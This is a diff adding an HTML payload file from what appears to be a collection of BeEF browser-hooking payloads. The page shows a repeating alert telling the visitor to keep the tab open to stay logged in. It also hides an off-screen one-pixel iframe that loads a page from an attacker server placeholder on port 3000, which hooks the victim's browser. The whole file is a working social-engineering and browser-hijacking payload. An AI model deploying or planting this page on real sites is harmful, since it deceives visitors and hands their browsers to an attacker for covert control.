+++ payloads/beef-hooks/beef_alert-iFrame
@@ -1,0 +1,20 @@
+<html>
+  <head>
+    <script type="text/javascript">
+    window.onload = function popup() 
+    {
+     if(!alert("Keep this tab open to stay logged in")) popup()
+    }
+    </script>
+  </head>
+    <body>
+    Thank you for complying with our TS
+    <!-- The below should force the pop-up, but it doesn't -->
+    <!-- <a href="javascript: void(0)" fLoad="popup()"> -->
+    <div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">
+      <iframe width="1" scrolling="no" height="1" frameborder="0" src="http://<ip-address>:3000/demos/butcher/index.html">
+    </div>
+   
+  </body>
+</html>
+
